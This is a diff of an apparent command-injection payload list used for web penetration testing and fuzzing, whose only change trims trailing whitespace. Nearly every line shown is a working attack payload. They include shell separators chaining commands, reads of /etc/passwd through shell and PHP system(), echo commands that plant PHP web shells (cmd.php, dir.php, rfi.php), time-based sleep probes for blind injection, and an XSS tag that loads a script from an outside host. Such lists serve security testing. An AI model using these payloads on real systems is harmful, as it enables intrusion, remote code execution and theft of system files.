@@ -111,15 +111,15 @@ cat /etc/passwd
 system('cat /etc/passwd');
 <?php system("cat /etc/passwd");?>
 `
-|| 
-| 
-; 
+||
+|
+;
 '
 '"
 "
 "'
-& 
-&& 
+&
+&&
 %0a
 %0a%0d
 
@@ -175,10 +175,10 @@ echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=
 & echo "<?php include($_GET['page']); ?>" > rfi.php
 && echo "<?php include($_GET['page']); ?>" > rfi.php
 echo "<?php include($_GET['page']); ?>" > rfi.php
-| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
-; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
-& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
-&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
+| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php
+; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
 echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
 | echo "<?php system($_GET['cmd'])| ?>" > cmd.php
 ; echo "<?php system($_GET['cmd']); ?>" > cmd.php
@@ -386,13 +386,13 @@ sleep 1
 | sleep 10
 ; sleep 10
 {${sleep(10)}}
-& sleep 10 
+& sleep 10
 && sleep 10
 sleep 10
 || sleep 15
 | sleep 15
 ; sleep 15
-& sleep 15 
+& sleep 15
 && sleep 15
  {${sleep(20)}}
 {${sleep(20)}}
@@ -403,8 +403,8 @@ sleep 10
 & sleep 5
 && sleep 5
 sleep 5
- {${sleep(hexdec(dechex(20)))}} 
-{${sleep(hexdec(dechex(20)))}} 
+ {${sleep(hexdec(dechex(20)))}}
+{${sleep(hexdec(dechex(20)))}}
 sysinfo
 | sysinfo
 ; sysinfo
